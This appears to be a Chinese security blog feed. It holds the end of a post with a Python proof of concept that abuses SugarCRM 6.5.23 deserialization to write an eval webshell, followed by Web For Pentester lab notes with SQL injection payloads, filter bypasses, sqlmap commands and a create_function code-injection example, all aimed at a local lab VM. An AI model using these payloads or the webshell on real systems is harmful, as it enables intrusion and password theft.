<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import requests as req</div><div class="line"></div><div class="line">url = &apos;http://127.0.0.1/sugarcrm_dev-6.5.23/service/v4/rest.php&apos;</div><div class="line"></div><div class="line">data = &#123;  </div><div class="line">    &apos;method&apos;: &apos;login&apos;,</div><div class="line">    &apos;input_type&apos;: &apos;Serialize&apos;,</div><div class="line">    &apos;rest_data&apos;: &apos;O:+14:&quot;SugarCacheFile&quot;:23:&#123;S:17:&quot;\\00*\\00_cacheFileName&quot;;s:15:&quot;../custom/1.php&quot;;S:16:&quot;\\00*\\00_cacheChanged&quot;;b:1;S:14:&quot;\\00*\\00_localStore&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[\&apos;HHH\&apos;]); ?&gt;&quot;;&#125;&#125;&apos;,</div><div class="line">&#125;</div><div class="line"></div><div class="line">req.post(url, data=data)</div></pre></td></tr></table></figure></p>
<p>脚本执行后shell位于custom/1.php：<br><img src="http://obr4sfdq7.bkt.clouddn.com/php5.png" alt=""></p>
<h2 id="Java反序列化漏洞（待续）"><a href="#Java反序列化漏洞（待续）" class="headerlink" title="Java反序列化漏洞（待续）"></a>Java反序列化漏洞（待续）</h2><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://paper.seebug.org/39/" target="_blank" rel="external">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a><br><a href="http://www.cnblogs.com/test404/p/6486435.html" target="_blank" rel="external">PHP反序列化漏洞与CVE-2016-7124</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Web For Pentester I 练习笔记</title>
    <link href="http://uknowsec.cn/posts/notes/Web-For-Pentester-I-%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>http://uknowsec.cn/posts/notes/Web-For-Pentester-I-练习笔记.html</id>
    <published>2017-07-20T07:07:46.000Z</published>
    <updated>2017-07-24T02:18:54.264Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>ISO镜像:<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="external">web_for_pentester_i386.iso</a></p>
<p>新建虚拟机添加web_for_pentester_i386.iso镜像，桥接网络即可。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p>preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。</p>
<h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int preg_match( string pattern, string subject [, array matches ] )</div></pre></td></tr></table></figure>
<h4 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>pattern</td>
<td style="text-align:center">正则表达式</td>
</tr>
<tr>
<td>subject</td>
<td style="text-align:center">需要匹配检索的对象</td>
</tr>
<tr>
<td>matches</td>
<td style="text-align:center">可选，存储匹配结果的数组， matches[0] 将包含与整个模式匹配的文本 matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推</td>
</tr>
</tbody>
</table>
<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><p>preg_replace() 函数用于正则表达式的搜索和替换。</p>
<h4 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</div></pre></td></tr></table></figure>
<h4 id="参数说明：-1"><a href="#参数说明：-1" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>pattern</td>
<td style="text-align:center">正则表达式</td>
</tr>
<tr>
<td>replacement</td>
<td style="text-align:center">替换的内容</td>
</tr>
<tr>
<td>subject</td>
<td style="text-align:center">需要匹配替换的对象</td>
</tr>
<tr>
<td>limit</td>
<td style="text-align:center">可选，指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换</td>
</tr>
</tbody>
</table>
<h4 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h4><p>当Pattern参数使用/e修正符时，preg_replace函数会将replacement参数当作 PHP代码执行，那么，针对此种情况，当replacement内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p>
<h3 id="正则表达式中的模式修正符"><a href="#正则表达式中的模式修正符" class="headerlink" title="正则表达式中的模式修正符"></a>正则表达式中的模式修正符</h3><p>模式修正符就是字母，只不过这些在模式修正符的应用之中有特殊的含义。下面我来看看都有哪些模式修正符，请看下表： </p>
<table>
<thead>
<tr>
<th>模式修正符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>i</td>
<td style="text-align:center">表示在和模式进行匹配进不区分大小写</td>
</tr>
<tr>
<td>m</td>
<td style="text-align:center">将模式视为多行，使用^和$表示任何一行都可以以正则表达式开始或结束</td>
</tr>
<tr>
<td>s</td>
<td style="text-align:center">如果没有使用这个模式修正符号，元字符中的”.”默认不能表示换行符号,将字符串视为单行</td>
</tr>
<tr>
<td>x</td>
<td style="text-align:center">表示模式中的空白忽略不计</td>
</tr>
<tr>
<td>e</td>
<td style="text-align:center">正则表达式必须使用在preg_replace替换字符串的函数中时才可以使用</td>
</tr>
<tr>
<td>A</td>
<td style="text-align:center">以模式字符串开头，相当于元字符^</td>
</tr>
<tr>
<td>Z</td>
<td style="text-align:center">以模式字符串结尾，相当于元字符$</td>
</tr>
<tr>
<td>U</td>
<td style="text-align:center">正则表达式的特点：就是比较“贪婪”，使用该模式修正符可以取消贪婪模式</td>
</tr>
</tbody>
</table>
<h3 id="prompt"><a href="#prompt" class="headerlink" title="prompt()"></a>prompt()</h3><p>prompt() 方法用于显示可提示用户进行输入的对话框</p>
<h4 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">prompt(text,defaultText)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-2"><a href="#参数说明：-2" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>text</td>
<td style="text-align:center">可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）。</td>
</tr>
<tr>
<td>defaultText</td>
<td style="text-align:center">可选。默认的输入文本。</td>
</tr>
</tbody>
</table>
<h3 id="confirm"><a href="#confirm" class="headerlink" title="confirm()"></a>confirm()</h3><p>confirm() 方法用于显示一个带有指定消息和 OK 及取消按钮的对话框。</p>
<h4 id="语法：-3"><a href="#语法：-3" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">confirm(message)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-3"><a href="#参数说明：-3" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>message</td>
<td style="text-align:center">要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本）</td>
</tr>
</tbody>
</table>
<h3 id="fromCharCode"><a href="#fromCharCode" class="headerlink" title="fromCharCode()"></a>fromCharCode()</h3><p>fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串</p>
<h4 id="语法：-4"><a href="#语法：-4" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">String.fromCharCode(numX,numX,...,numX)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-4"><a href="#参数说明：-4" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>numX</td>
<td style="text-align:center">必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。</td>
</tr>
</tbody>
</table>
<h3 id="eval-string"><a href="#eval-string" class="headerlink" title="eval(string)"></a>eval(string)</h3><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p>
<h4 id="语法：-5"><a href="#语法：-5" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(string)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-5"><a href="#参数说明：-5" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。要计算的字符串，其中含有要计算的 JavaScript 表达式或要执行的语句。</td>
</tr>
</tbody>
</table>
<h3 id="Document-write"><a href="#Document-write" class="headerlink" title="Document.write()"></a>Document.write()</h3><p>write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。<br>可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。</p>
<h4 id="语法：-6"><a href="#语法：-6" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.write(exp1,exp2,exp3,....)</div></pre></td></tr></table></figure>
<h3 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h3><p>hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。</p>
<p>假设当前的URL是<a href="http://www.uknowsec/test.htm#PART2：" target="_blank" rel="external">http://www.uknowsec/test.htm#PART2：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">document.write(location.hash);</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>以上实例输出结果：</p>
<p>#part2</p>
<h3 id="substring"><a href="#substring" class="headerlink" title="substring()"></a>substring()</h3><p>substring() 方法用于提取字符串中介于两个指定下标之间的字符。</p>
<h4 id="语法：-7"><a href="#语法：-7" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">stringObject.substring(start,stop)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-6"><a href="#参数说明：-6" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>start</td>
<td style="text-align:center">必需。一个非负的整数，规定要提取的子串的第一个字符在 stringObject 中的位置。</td>
</tr>
<tr>
<td>stop</td>
<td style="text-align:center">可选。一个非负的整数，比要提取的子串的最后一个字符在 stringObject 中的位置多 1。如果省略该参数，那么返回的子串会一直到字符串的结尾。</td>
</tr>
</tbody>
</table>
<h3 id="strstr"><a href="#strstr" class="headerlink" title="strstr()"></a>strstr()</h3><p>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>注释：该函数是二进制安全的。<br>注释：该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 stristr() 函数。</p>
<h4 id="语法：-8"><a href="#语法：-8" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strstr(string,search,before_search)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-7"><a href="#参数说明：-7" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定被搜索的字符串。</td>
</tr>
<tr>
<td>search</td>
<td style="text-align:center">必需。规定所搜索的字符串。如果此参数是数字，则搜索匹配此数字对应的 ASCII 值的字符。</td>
</tr>
<tr>
<td>before_search</td>
<td style="text-align:center">可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。</td>
</tr>
</tbody>
</table>
<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<h4 id="语法：-9"><a href="#语法：-9" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">addslashes(string)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-8"><a href="#参数说明：-8" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
</tbody>
</table>
<h3 id="create-function-代码注入"><a href="#create-function-代码注入" class="headerlink" title="create_function()代码注入"></a>create_function()代码注入</h3><h4 id="测试环境版本："><a href="#测试环境版本：" class="headerlink" title="测试环境版本："></a>测试环境版本：</h4><p>apache +php 5.2、apache +php 5.3</p>
<h4 id="有问题的代码："><a href="#有问题的代码：" class="headerlink" title="有问题的代码："></a>有问题的代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//02-8.php?id=2;&#125;phpinfo();/*</div><div class="line">$id=$_GET[&apos;id&apos;];</div><div class="line">$str2=&apos;echo  &apos;.$a.&apos;test&apos;.$id.&quot;;&quot;;</div><div class="line">echo $str2;</div><div class="line">echo &quot;&lt;br/&gt;&quot;;</div><div class="line">echo &quot;==============================&quot;;</div><div class="line">echo &quot;&lt;br/&gt;&quot;;</div><div class="line">$f1 = create_function(&apos;$a&apos;,$str2);</div><div class="line">echo &quot;&lt;br/&gt;&quot;;</div><div class="line">echo &quot;==============================&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/libtest/02-8.php?id=2;&#125;phpinfo();/*</div></pre></td></tr></table></figure>
<h4 id="实现原理："><a href="#实现原理：" class="headerlink" title="实现原理："></a>实现原理：</h4><p>由于id=2;}phpinfo();/*<br>执行函数为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">源代码：</div><div class="line">function fT($a) &#123;</div><div class="line">  echo &quot;test&quot;.$a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">注入后代码：</div><div class="line">function fT($a) &#123;</div><div class="line">  echo &quot;test&quot;;&#125;</div><div class="line">  phpinfo();/*;//此处为注入代码。</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h3><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
<h4 id="相关函数："><a href="#相关函数：" class="headerlink" title="相关函数："></a>相关函数：</h4><p>ltrim() - 移除字符串左侧的空白字符或其他预定义字符<br>rtrim() - 移除字符串右侧的空白字符或其他预定义字符</p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">trim(string,charlist)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-9"><a href="#参数说明：-9" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要检查的字符串。</td>
</tr>
<tr>
<td>charlist</td>
<td style="text-align:center">可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符： “\0” - NULL “\t” - 制表符 “\n” - 换行 “\x0B” - 垂直制表符 “\r” - 回车 “ “ - 空格</td>
</tr>
</tbody>
</table>
<h3 id="htmlentities"><a href="#htmlentities" class="headerlink" title="htmlentities()"></a>htmlentities()</h3><p>htmlentities() 函数把字符转换为 HTML 实体。</p>
<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">htmlentities(string,flags,character-set,double_encode)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-10"><a href="#参数说明：-10" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转换的字符串。</td>
</tr>
<tr>
<td>flags</td>
<td style="text-align:center">可选。规定如何处理引号、无效的编码以及使用哪种文档类型。</td>
</tr>
<tr>
<td>character-set</td>
<td style="text-align:center">可选。一个规定了要使用的字符集的字符串。</td>
</tr>
<tr>
<td>double_encode</td>
<td style="text-align:center">可选。布尔值，规定是否编码已存在的 HTML 实体。 TRUE - 默认。将对每个实体进行转换。FALSE - 不会对已存在的 HTML 实体进行编码。</td>
</tr>
</tbody>
</table>
<h3 id="header"><a href="#header" class="headerlink" title="header()"></a>header()</h3><p>header() 函数向客户端发送原始的 HTTP 报头。</p>
<h4 id="语法：-10"><a href="#语法：-10" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">header(string,replace,http_response_code)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-11"><a href="#参数说明：-11" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要发送的报头字符串。</td>
</tr>
<tr>
<td>replace</td>
<td style="text-align:center">可选。指示该报头是否替换之前的报头，或添加第二个报头。默认是 true（替换）。false（允许相同类型的多个报头）。</td>
</tr>
<tr>
<td>http_response_code</td>
<td style="text-align:center">可选。把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）</td>
</tr>
</tbody>
</table>
<h2 id="SQL-injections"><a href="#SQL-injections" class="headerlink" title="SQL injections"></a>SQL injections</h2><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;; $result = mysql_query($sql); if ($result) &#123; ?&gt;</div></pre></td></tr></table></figure>
<p>字符类型的注入，无过滤<br>用来练习手注是个不错的题目</p>
<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; 页面返回异常</div><div class="line"></div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; and 1=1%23 页面返回正常</div><div class="line"></div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; and 1=2%23 页面返回正常</div></pre></td></tr></table></figure>
<h4 id="判断字段长"><a href="#判断字段长" class="headerlink" title="判断字段长"></a>判断字段长</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; order by 5%23 页面返回正常</div><div class="line"></div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; order by 6%23 页面返回异常</div></pre></td></tr></table></figure>
<p>推断出这个表中有5个字段</p>
<h4 id="猜解当前数据库名；"><a href="#猜解当前数据库名；" class="headerlink" title="猜解当前数据库名；"></a>猜解当前数据库名；</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,database(),3,4,5%23</div></pre></td></tr></table></figure>
<h4 id="猜解所有的数据库"><a href="#猜解所有的数据库" class="headerlink" title="猜解所有的数据库"></a>猜解所有的数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,SCHEMA_NAME,3,4,5 from information_schema.SCHEMATA%23</div></pre></td></tr></table></figure>
<h4 id="猜解所有的表名"><a href="#猜解所有的表名" class="headerlink" title="猜解所有的表名"></a>猜解所有的表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,table_name,3,4,5 from information_schema.tables%23</div></pre></td></tr></table></figure>
<h4 id="猜解当前数据库（exercises）的所以表名"><a href="#猜解当前数据库（exercises）的所以表名" class="headerlink" title="猜解当前数据库（exercises）的所以表名"></a>猜解当前数据库（exercises）的所以表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,table_name,3,4,5 from information_schema.tables where table_schema= database()%23</div></pre></td></tr></table></figure>
<h4 id="猜解当前数据库的user的字段名"><a href="#猜解当前数据库的user的字段名" class="headerlink" title="猜解当前数据库的user的字段名"></a>猜解当前数据库的user的字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,COLUMN_NAME,2,4,5 from information_schema.COLUMNS where table_name = &apos;users&apos;%23</div></pre></td></tr></table></figure>
<h4 id="判断版本号"><a href="#判断版本号" class="headerlink" title="判断版本号"></a>判断版本号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,version(),2,4,5%23</div></pre></td></tr></table></figure>
<h4 id="判断用户名"><a href="#判断用户名" class="headerlink" title="判断用户名"></a>判断用户名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,user(),2,4,5%23  </div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,current_user(),2,4,5%23</div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,system_user(),2,4,5%23</div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,session_user(),2,4,5%23</div></pre></td></tr></table></figure>
<h4 id="读取值"><a href="#读取值" class="headerlink" title="读取值"></a>读取值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,name,passwd,4,5 from users%23</div></pre></td></tr></table></figure>
<h4 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example1.php?name=root --dbs</div></pre></td></tr></table></figure>
<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (preg_match(&apos;/ /&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;ERROR NO SPACE&quot;); &#125; $sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;; $result = mysql_query($sql);</div></pre></td></tr></table></figure>
<p>与example1差不多，过滤了空格，语句中存现空格就会报错</p>
<p>mysql注入绕过空格过滤的方法：</p>
<p>1、水平制表(HT) url编码：%09</p>
<p>2、注释绕过空格   /<em>注释</em>/</p>
<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;%09union%09select%091,name,passwd,4,5%09from%09users%23  %09替换空格绕过</div><div class="line"></div><div class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;/**/union/**/select/**/1,name,passwd,4,5/**/from/**/users%23  /**/替换空格绕过</div></pre></td></tr></table></figure>
<h4 id="SQLMAP-1"><a href="#SQLMAP-1" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><p>调用space2comment.py<br>用“/**/”替换空格符绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example3.php?name=root --dbs --tamper=space2comment.py</div></pre></td></tr></table></figure></p>
<h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (preg_match(&apos;/\s+/&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;ERROR NO SPACE&quot;); &#125; $sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;;</div></pre></td></tr></table></figure>
<p>在example2的基础上，\s匹配任何空白字符,包括空格、制表符、换页符等，全部过滤掉<br>可以使用example2中 /<em>注释</em>/ 绕过过滤</p>
<h4 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;/**/union/**/select/**/1,name,passwd,4,5/**/from/**/users%23</div></pre></td></tr></table></figure>
<h4 id="SQLMAP-2"><a href="#SQLMAP-2" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><p>调用space2comment.py<br>用“/**/”替换空格符绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example3.php?name=root --dbs --tamper=space2comment.py</div></pre></td></tr></table></figure>
<h3 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql=&quot;SELECT * FROM users where id=&quot;; $sql.=mysql_real_escape_string($_GET[&quot;id&quot;]).&quot; &quot;; $result = mysql_query($sql);</div></pre></td></tr></table></figure>
<p>数值型的注入，过滤了单引号等，对数值型无效</p>
<h4 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example4.php?id=2 or 1=1</div><div class="line">http://192.168.1.105/sqli/example4.php?id=2 union select 1,name, passwd,4,5 from users</div></pre></td></tr></table></figure>
<h4 id="SQLMAP-3"><a href="#SQLMAP-3" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example4.php?id=2 --dbs</div></pre></td></tr></table></figure>
